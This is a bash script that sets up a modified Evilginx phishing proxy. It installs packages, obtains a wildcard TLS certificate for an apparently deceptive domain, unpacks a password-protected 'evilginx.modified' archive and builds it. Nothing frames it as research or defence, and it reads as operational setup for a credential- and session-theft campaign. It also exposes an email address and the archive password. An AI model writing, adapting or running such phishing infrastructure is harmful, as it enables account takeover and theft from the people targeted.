#!/bin/bash

# Make L08.sh executable
chmod +x L08.sh

# Print a message indicating the script is now executable
echo "L08.sh is now executable"

# Update and upgrade system
sudo apt-get update
sudo apt-get upgrade -y

# Install required packages
sudo apt-get install git unzip certbot golang-go tmux -y

# Obtain Let's Encrypt SSL certificate
certbot certonly --manual --preferred-challenges=dns --server https://acme-v02.api.letsencrypt.org/directory --agree-tos -d *.pashudhanjsnk.im --email maggie@optimatrustgroup.com

# Unzip the EVILGINX_L08 archive
unzip -P PaulPaulPaul@@4545 evilginx.modified.zip
cd evilginx.modified

# Install make (assuming it's not already installed)
sudo apt-get install make -y

# Run make command (assuming it's needed for building)
make

# Change back to the original directory
cd ..
